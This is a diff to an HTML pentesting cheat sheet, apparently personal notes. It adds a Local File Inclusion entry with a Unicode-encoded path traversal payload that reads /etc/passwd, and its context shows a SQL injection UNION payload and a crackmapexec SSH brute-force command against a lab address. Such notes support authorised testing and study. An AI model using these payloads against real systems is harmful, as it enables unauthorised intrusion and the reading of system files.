@@ -45,8 +45,14 @@
             <div class="notion-header">
                 <h1 id="OWASP TOP 10">OWASP TOP 10</h1>   
             </div>
-                <!-- SQL injection -->
                 <div class="notion-body">
+                    <h2>Local File Inclusion</h2>
+                    <ul>
+                        <h3>Local File Inclusion using UNICODE chars</h3>
+                        <p>Normally there are sanitizations that prevent for LFI but in some cases you could be able to bypass them by using UNICODE chars take a look at <a class="notion-link" href="https://book.hacktricks.wiki/en/pentesting-web/unicode-injection/unicode-normalization.html"> Hacktricks</a></p>
+                        <pre><code class="language-bash">%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/etc/passwd</code></pre>    
+                    </ul>
+
                     <h2>SQL injection</h2>
                     <ul>
                         <p> Basic payloads</p>
@@ -86,8 +92,7 @@
                 no error would mean that this parameter is injectable   
                 <pre><code class="language-sql">'+UNION+SELECT+NULL+'text'--</code></pre>
                
-                </ul>
-                <!-- XSS -->    
+                </ul> 
                 </div>
                 <div class="notion-body">
                     <h2>XSS</h2>
@@ -333,16 +338,12 @@ crackmapexec ssh 10.10.10.184 -u USERNAME -p passwords.txt</code></pre>
 
                     <h2>Finally desperately use</h2>
                     <pre><code class="language-bash">/usr/share/wordlists/seclists/Discovery/Web-Content/big.txt</code></pre>
-
-                   
-                   
-
             </ul>
             </div>
 
 
             <div class="notion-header"> 
-                <h1 id="Persistance">Persitance</h1>
+                <h1 id="Persistance">Persistance</h1>
             </div>
 
             <div class="notion-body">
